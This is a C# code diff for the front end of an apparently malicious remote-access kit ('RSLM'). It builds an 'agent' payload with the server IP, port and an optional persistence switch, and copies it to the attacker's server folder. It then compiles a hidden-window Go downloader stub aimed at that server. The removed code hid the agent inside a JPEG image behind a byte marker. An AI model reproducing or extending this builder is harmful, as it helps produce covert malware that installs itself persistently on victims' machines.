@@ -36,21 +36,48 @@ namespace rslm_frontend.Views
             });
         }
 
-        private void CopyToServer()
+        private void CleanOutputDirectory()
+        {
+            Dispatcher.Invoke(() =>
+            {
+                try
+                {
+                    if (Directory.Exists(_outputDir))
+                    {
+                        foreach (string file in Directory.GetFiles(_outputDir))
+                        {
+                            try
+                            {
+                                File.Delete(file);
+                            }
+                            catch { }
+                        }
+                        TerminalBox.AppendText("✅ Anciens fichiers supprimés\n");
+                        ScrollViewer.ScrollToEnd();
+                    }
+                }
+                catch (Exception ex)
+                {
+                    TerminalBox.AppendText($"⚠ Erreur nettoyage: {ex.Message}\n");
+                    ScrollViewer.ScrollToEnd();
+                }
+            });
+        }
+
+        private void CopyUpdateToServer()
         {
             try
             {
-                string imgPath = Path.Combine(_outputDir, "img.jpg");
-
-                if (File.Exists(imgPath))
+                string updatePath = Path.Combine(_outputDir, "update.dat");
+                if (File.Exists(updatePath))
                 {
-                    string destPath = Path.Combine(_serverDir, "img.jpg");
-                    File.Copy(imgPath, destPath, true);
-                    AppendToTerminal($"✅ img.jpg copié vers le serveur : {_serverDir}");
+                    string destPath = Path.Combine(_serverDir, "update.dat");
+                    File.Copy(updatePath, destPath, true);
+                    AppendToTerminal($"✅ update.dat copié vers le serveur : {_serverDir}");
                 }
                 else
                 {
-                    AppendToTerminal($"⚠ img.jpg non trouvé dans {_outputDir}");
+                    AppendToTerminal($"⚠ update.dat non trouvé dans {_outputDir}");
                 }
             }
             catch (Exception ex)
@@ -68,6 +95,8 @@ namespace rslm_frontend.Views
             AppendToTerminal($"IP: {serverIp}, Port: {serverPort}");
             AppendToTerminal($"Dossier de sortie: {_outputDir}");
 
+            CleanOutputDirectory();
+
             if (!File.Exists(_builderPath))
             {
                 AppendToTerminal($"ERREUR: RSLM.Builder.exe non trouvé");
@@ -83,11 +112,18 @@ namespace rslm_frontend.Views
             try
             {
                 string updatePath = Path.Combine(_outputDir, "update.dat");
+                bool enablePersistence = false;
+
+                // Accès au CheckBox via Dispatcher
+                Dispatcher.Invoke(() =>
+                {
+                    enablePersistence = PersistenceCheckBox.IsChecked == true;
+                });
 
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
                     FileName = _builderPath,
-                    Arguments = $"\"{serverIp}\" {serverPort} false false \"{updatePath}\" false false",
+                    Arguments = $"\"{serverIp}\" {serverPort} {enablePersistence.ToString().ToLower()} false \"{updatePath}\" false false",
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     RedirectStandardOutput = true,
@@ -103,9 +139,11 @@ namespace rslm_frontend.Views
 
                     Dispatcher.Invoke(() =>
                     {
-                        AppendToTerminal(output);
+                        if (!string.IsNullOrEmpty(output))
+                            TerminalBox.AppendText(output + "\n");
                         if (!string.IsNullOrEmpty(error))
-                            AppendToTerminal($"ERREUR: {error}");
+                            TerminalBox.AppendText($"ERREUR: {error}\n");
+                        ScrollViewer.ScrollToEnd();
                     });
                 }
 
@@ -113,43 +151,44 @@ namespace rslm_frontend.Views
                 {
                     if (File.Exists(updatePath))
                     {
-                        AppendToTerminal($"✅ Agent généré: {updatePath}");
+                        TerminalBox.AppendText($"✅ Agent généré: {updatePath}\n");
+                        TerminalBox.AppendText($"   Persistance: {(enablePersistence ? "activée" : "désactivée")}\n");
                         StatusText.Text = "Agent généré";
+                        ScrollViewer.ScrollToEnd();
+
+                        // Copier vers le serveur
+                        try
+                        {
+                            string destPath = Path.Combine(_serverDir, "update.dat");
+                            File.Copy(updatePath, destPath, true);
+                            TerminalBox.AppendText($"✅ update.dat copié vers le serveur : {_serverDir}\n");
+                        }
+                        catch (Exception ex)
+                        {
+                            TerminalBox.AppendText($"ERREUR copie: {ex.Message}\n");
+                        }
+                        ScrollViewer.ScrollToEnd();
                     }
                     else
                     {
-                        AppendToTerminal("❌ Échec de génération");
+                        TerminalBox.AppendText("❌ Échec de génération\n");
                         StatusText.Text = "Erreur";
+                        ScrollViewer.ScrollToEnd();
                     }
                 });
             }
             catch (Exception ex)
             {
-                Dispatcher.Invoke(() => AppendToTerminal($"ERREUR: {ex.Message}"));
+                Dispatcher.Invoke(() => TerminalBox.AppendText($"ERREUR: {ex.Message}\n"));
             }
         }
 
         private void GenerateStub_Click(object sender, RoutedEventArgs e)
         {
             string serverIp = ServerIpBox.Text;
-            string updatePath = Path.Combine(_outputDir, "update.dat");
 
-            AppendToTerminal("\n=== Génération du stub ===");
+            AppendToTerminal("\n=== Génération du stub (téléchargement) ===");
             AppendToTerminal($"Dossier de sortie: {_outputDir}");
-
-            if (!File.Exists(updatePath))
-            {
-                AppendToTerminal("ERREUR: update.dat non trouvé. Générez d'abord l'agent.");
-                StatusText.Text = "Erreur";
-                return;
-            }
-
-            if (!File.Exists("cat.jpg"))
-            {
-                AppendToTerminal("ERREUR: cat.jpg non trouvé. Placez une image dans le dossier.");
-                StatusText.Text = "Erreur";
-                return;
-            }
 
             Task.Run(() => RunStubGenerator(serverIp));
         }
@@ -158,62 +197,23 @@ namespace rslm_frontend.Views
         {
             try
             {
-                string updatePath = Path.Combine(_outputDir, "update.dat");
-                string imgPath = Path.Combine(_outputDir, "img.jpg");
                 string stubPath = Path.Combine(_outputDir, "stub.exe");
+                string goDir = @"C:\Users\Keylan\Desktop\RLSM.6.04\RSLM.Builder\Ressource\go";
+                string goFile = Path.Combine(goDir, "downloader.go");
 
-                Dispatcher.Invoke(() => AppendToTerminal("Création de img.jpg..."));
-
-                byte[] cat = File.ReadAllBytes("cat.jpg");
-                byte[] agent = File.ReadAllBytes(updatePath);
-                byte[] marker = { 0xAA, 0xAA, 0xAA };
-
-                byte[] img = new byte[cat.Length + marker.Length + agent.Length];
-                Buffer.BlockCopy(cat, 0, img, 0, cat.Length);
-                Buffer.BlockCopy(marker, 0, img, cat.Length, marker.Length);
-                Buffer.BlockCopy(agent, 0, img, cat.Length + marker.Length, agent.Length);
-
-                File.WriteAllBytes(imgPath, img);
-                Dispatcher.Invoke(() => AppendToTerminal($"✅ img.jpg créé dans {_outputDir}"));
-
-                Dispatcher.Invoke(() => AppendToTerminal("Vérification de Go..."));
-                try
-                {
-                    Process p = Process.Start(new ProcessStartInfo { FileName = "go", Arguments = "version", UseShellExecute = false, CreateNoWindow = true });
-                    p.WaitForExit(1000);
-                    if (p.ExitCode != 0) throw new Exception();
-                }
-                catch
-                {
-                    Dispatcher.Invoke(() => AppendToTerminal("❌ Go n'est pas installé. Télécharge-le sur https://go.dev/dl/"));
-                    Dispatcher.Invoke(() => StatusText.Text = "Erreur: Go non installé");
-                    return;
-                }
-                Dispatcher.Invoke(() => AppendToTerminal("✅ Go trouvé"));
-
-                string goFile = "";
-                if (File.Exists("go\\downloader.go")) goFile = "go\\downloader.go";
-                else if (File.Exists("Ressource\\go\\downloader.go")) goFile = "Ressource\\go\\downloader.go";
-                else if (File.Exists("..\\go\\downloader.go")) goFile = "..\\go\\downloader.go";
-
-                if (string.IsNullOrEmpty(goFile))
-                {
-                    Dispatcher.Invoke(() => AppendToTerminal("❌ downloader.go non trouvé"));
-                    return;
-                }
-
+                // Lire et modifier le code Go avec l'IP du serveur
                 string code = File.ReadAllText(goFile);
-                code = code.Replace("{IP}", serverIp);
-                code = code.Replace("{PORT}", "8080");
+                code = code.Replace("127.0.0.1", serverIp);
 
-                string tempFile = Path.GetTempFileName() + ".go";
-                File.WriteAllText(tempFile, code);
+                string tempGoFile = Path.Combine(goDir, "temp_stub.go");
+                File.WriteAllText(tempGoFile, code);
 
-                Dispatcher.Invoke(() => AppendToTerminal("Compilation de stub.exe..."));
+                Dispatcher.Invoke(() => AppendToTerminal($"⚙️ Compilation du stub..."));
+
                 ProcessStartInfo build = new ProcessStartInfo
                 {
-                    FileName = "go",
-                    Arguments = $"build -ldflags=\"-H windowsgui -s -w\" -o \"{stubPath}\" \"{tempFile}\"",
+                    FileName = "cmd.exe",
+                    Arguments = $"/c cd /d \"{goDir}\" && go build -ldflags=\"-H windowsgui -s -w\" -o stub.exe temp_stub.go && copy stub.exe \"{stubPath}\"",
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     RedirectStandardOutput = true,
@@ -222,25 +222,32 @@ namespace rslm_frontend.Views
 
                 using (Process p = Process.Start(build))
                 {
+                    string output = p.StandardOutput.ReadToEnd();
                     string error = p.StandardError.ReadToEnd();
                     p.WaitForExit();
 
+                    if (!string.IsNullOrEmpty(output))
+                        Dispatcher.Invoke(() => AppendToTerminal(output));
+                    if (!string.IsNullOrEmpty(error))
+                        Dispatcher.Invoke(() => AppendToTerminal($"ERREUR: {error}"));
+                }
+
+                File.Delete(tempGoFile);
+
+                Dispatcher.Invoke(() =>
+                {
                     if (File.Exists(stubPath))
                     {
-                        Dispatcher.Invoke(() => AppendToTerminal($"✅ stub.exe généré dans {_outputDir}"));
-                        Dispatcher.Invoke(() => StatusText.Text = "Stub généré");
+                        FileInfo fi = new FileInfo(stubPath);
+                        AppendToTerminal($"✅ stub.exe généré ! Taille: {fi.Length} bytes");
+                        StatusText.Text = "Stub généré";
                     }
                     else
                     {
-                        Dispatcher.Invoke(() => AppendToTerminal($"❌ Échec: {error}"));
-                        Dispatcher.Invoke(() => StatusText.Text = "Erreur");
+                        AppendToTerminal("❌ Échec de génération");
+                        StatusText.Text = "Erreur";
                     }
-                }
-
-                File.Delete(tempFile);
-
-                // Copier automatiquement img.jpg vers le serveur
-                CopyToServer();
+                });
             }
             catch (Exception ex)
             {
